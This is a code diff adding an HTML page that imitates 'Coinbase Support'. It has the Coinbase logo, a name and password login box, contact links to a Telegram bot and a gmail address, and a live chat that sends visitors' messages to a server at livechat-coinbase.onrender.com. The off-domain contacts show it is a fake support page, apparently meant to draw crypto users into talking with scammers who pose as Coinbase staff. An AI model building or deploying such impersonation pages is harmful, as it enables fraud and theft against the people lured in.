@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Coinbase Support</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #0a0f1c;
+      font-family: Arial, sans-serif;
+      color: white;
+    }
+    .container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .box {
+      background-color: #1e293b;
+      padding: 40px;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+    .logo {
+      height: 50px;
+      margin-bottom: 20px;
+    }
+    input, button {
+      font-size: 16px;
+      padding: 12px;
+      border-radius: 8px;
+      width: 100%;
+      margin: 10px 0;
+      border: none;
+      box-sizing: border-box;
+    }
+    button {
+      background-color: #3b82f6;
+      color: white;
+      cursor: pointer;
+    }
+    #livechat-button {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      z-index: 9999;
+    }
+    #chat-toggle-btn {
+      background-color: #0052ff;
+      border: none;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      color: white;
+      font-size: 26px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    #livechat-window {
+      opacity: 0;
+      transform: translateY(20px);
+      transition: all 0.3s ease;
+      pointer-events: none;
+      position: fixed;
+      bottom: 100px;
+      left: 20px;
+      width: 300px;
+      height: 400px;
+      background: #1e293b;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      z-index: 9999;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      padding: 10px;
+    }
+    #livechat-window #messages {
+      flex: 1;
+      overflow-y: auto;
+      border: 1px solid #444;
+      padding: 10px;
+      margin-bottom: 10px;
+      background-color: #0f172a;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="box">
+      <img src="coinbase-logo.png" alt="Coinbase" class="logo"/>
+      <h2>Log in to Support</h2>
+      <input type="text" placeholder="Name"/>
+      <input type="password" placeholder="Password"/>
+      <button onclick="document.getElementById('after-login').style.display='block'; window.scrollTo(0, document.body.scrollHeight)">Log In</button>
+    </div>
+    <div id="after-login" style="display:none; text-align:center;">
+      <h2 style="margin-top:40px;">Contact Options</h2>
+      <a href="https://t.me/coinbasesupportbot" class="link-button" target="_blank">📨 Contact via Telegram</a>
+      <a href="mailto:CoinbaseEuropeSafety@gmail.com" class="link-button">✉️ Contact via Email</a>
+    </div>
+  </div>
+  <div id="livechat-button">
+    <button id="chat-toggle-btn" onclick="toggleLivechat()">💬</button>
+  </div>
+  <div id="livechat-window">
+    <div id="messages"></div>
+    <input id="name" placeholder="Your name"/>
+    <input id="message" placeholder="Type a message"/>
+    <button onclick="sendMessage()">Send</button>
+  </div>
+  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+  <script>
+    let chatOpen = false;
+    function toggleLivechat() {
+      const chatWindow = document.getElementById("livechat-window");
+      const chatButton = document.getElementById("chat-toggle-btn");
+      if (!chatOpen) {
+        chatWindow.style.opacity = "1";
+        chatWindow.style.transform = "translateY(0)";
+        chatWindow.style.pointerEvents = "auto";
+        chatButton.innerHTML = "❌";
+      } else {
+        chatWindow.style.opacity = "0";
+        chatWindow.style.transform = "translateY(20px)";
+        chatWindow.style.pointerEvents = "none";
+        chatButton.innerHTML = "💬";
+      }
+      chatOpen = !chatOpen;
+    }
+    const socket = io('https://livechat-coinbase.onrender.com');
+    const messages = document.getElementById('messages');
+    socket.on('admin-reply', data => {
+      const div = document.createElement('div');
+      div.textContent = 'Support: ' + data.message;
+      messages.appendChild(div);
+    });
+    function sendMessage() {
+      const name = document.getElementById('name').value;
+      const msg = document.getElementById('message').value;
+      socket.emit('user-message', { name, message: msg });
+      const div = document.createElement('div');
+      div.textContent = 'You: ' + msg;
+      messages.appendChild(div);
+      document.getElementById('message').value = '';
+    }
+  </script>
+</body>
+</html>
